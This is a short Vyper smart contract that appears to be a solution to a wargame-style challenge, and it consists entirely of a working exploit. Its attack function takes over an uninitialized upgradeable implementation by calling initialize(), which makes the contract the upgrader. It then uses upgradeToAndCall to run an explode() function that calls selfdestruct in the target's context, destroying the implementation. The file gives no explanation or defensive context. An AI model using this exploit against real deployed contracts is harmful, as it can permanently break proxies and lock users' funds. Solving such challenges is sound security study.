# @version ^0.3.7

interface InstanceInterface:
    def upgrader() -> address: view
    def initialize(): nonpayable
    def upgradeToAndCall(
        newImplementation: address,
        data: Bytes[32],
    ): payable

owner: immutable(address)

instance: InstanceInterface

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    self.instance = _instance

@external
def attack():
    assert msg.sender == owner, "!owner"
    self.instance.initialize()
    assert self.instance.upgrader() == self, "!upgrader"
    self.instance.upgradeToAndCall(self, method_id("explode()"))

@external
def explode():
    assert tx.origin == owner, "!origin"
    selfdestruct(empty(address))
